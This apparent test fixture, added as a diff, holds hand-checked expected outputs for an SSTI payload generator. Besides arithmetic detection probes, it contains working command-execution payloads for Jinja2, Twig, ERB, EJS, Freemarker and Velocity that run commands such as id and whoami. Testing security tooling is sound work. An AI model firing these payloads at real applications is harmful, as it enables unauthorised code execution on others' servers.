@@ -1,0 +1,194 @@
+# SSTI 黄金样本（§13.2）
+# 期望值手写核算，不由工具反向生成。
+#
+# 这组样本的重点是**配对定界符槽位**（字典型槽位选项）和
+# **syntax_lang 语法校验**——两者都是加第三种漏洞类型时才逼出来的结构。
+
+ruleDB: v0.1.0
+
+samples:
+  # ---------- 配对定界符槽位：一个模板，五种引擎 ----------
+
+  - name: 探测模板 · Jinja2 定界符（默认）
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      outputs: [raw]
+    expect:
+      payload: "{{7*7}}"
+
+  - name: 探测模板 · Freemarker 定界符
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: freemarker}
+      outputs: [raw]
+    expect:
+      payload: "${7*7}"
+
+  - name: 探测模板 · ERB 定界符
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: erb}
+      outputs: [raw]
+    expect:
+      payload: "<%=7*7%>"
+
+  - name: 探测模板 · Thymeleaf 预处理定界符
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: thymeleaf}
+      outputs: [raw]
+    expect:
+      payload: "__${7*7}__"
+
+  - name: 探测模板 · 字符串乘法（区分 Jinja2 与 Twig）
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.str
+      slots: {d: jinja2}
+      outputs: [raw]
+    expect:
+      payload: "{{7*'7'}}"
+
+  - name: 非法引擎取值应报错（用户输入错误，不是空结果）
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      slots: {d: nosuchengine}
+      outputs: [raw]
+    expect:
+      raises: "不在 options 里"
+
+  # ---------- 语法校验：只有声明了 syntax_lang 的才真校验 ----------
+
+  - name: Jinja2 模板声明了 syntax_lang，真做语法校验
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.config
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      syntax: ok
+
+  - name: 引擎随槽位变的模板不做语法校验（拿不准就别假装）
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      outputs: [raw]
+    expect:
+      syntax: unchecked
+
+  # ---------- 各引擎载荷 ----------
+
+  - name: Jinja2 lipsum 走 cmd 默认值
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.lipsum
+      outputs: [raw]
+    expect:
+      payload: "{{lipsum.__globals__['os'].popen('whoami').read()}}"
+      syntax: ok
+
+  - name: Jinja2 subclasses 带下标槽位
+    state:
+      vuln: ssti
+      template: ssti.jinja2.rce.subclasses
+      slots: {idx: "100"}
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{''.__class__.__mro__[1].__subclasses__()[100].__init__.__globals__['os'].popen('id').read()}}"
+      syntax: ok
+
+  - name: Jinja2 {% set %} 中转
+    state:
+      vuln: ssti
+      template: ssti.jinja2.stmt.set
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{%set o=cycler.__init__.__globals__.os%}{{o.popen('id').read()}}"
+      syntax: ok
+
+  - name: Ruby ERB
+    state:
+      vuln: ssti
+      template: ssti.ruby.erb.rce.system
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<%= system(\"id\") %>"
+
+  - name: Ruby Slim 插值
+    state:
+      vuln: ssti
+      template: ssti.ruby.slim.detect
+      outputs: [raw]
+    expect:
+      payload: "#{7*7}"
+
+  - name: PHP Twig filter 过滤器
+    state:
+      vuln: ssti
+      template: ssti.php.twig.rce.filter
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "{{['id']|filter('system')}}"
+
+  - name: Node EJS
+    state:
+      vuln: ssti
+      template: ssti.node.ejs.rce.execsync
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<%= global.process.mainModule.require('child_process').execSync('id') %>"
+
+  - name: Java Freemarker Execute
+    state:
+      vuln: ssti
+      template: ssti.java.freemarker.execute
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+
+  - name: Java Velocity
+    state:
+      vuln: ssti
+      template: ssti.java.velocity.runtime
+      vars: {cmd: id}
+      outputs: [raw]
+    expect:
+      payload: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()"
+
+  # ---------- 编码管线遇到模板定界符 ----------
+
+  - name: URL 编码会连定界符一起编
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      bypasses: [bypass.url]
+      outputs: [raw]
+    expect:
+      payload: "%7B%7B7%2A7%7D%7D"
+
+  - name: curl 输出（SSTI 放进 URL 参数）
+    state:
+      vuln: ssti
+      template: ssti.generic.detect.arith
+      submit: query
+      host: example.com
+      path: /
+      param: name
+      method: GET
+      shell: bash
+      outputs: [curl]
+    expect:
+      outputs:
+        curl: "curl 'http://example.com/?name=%7B%7B7%2A7%7D%7D'"
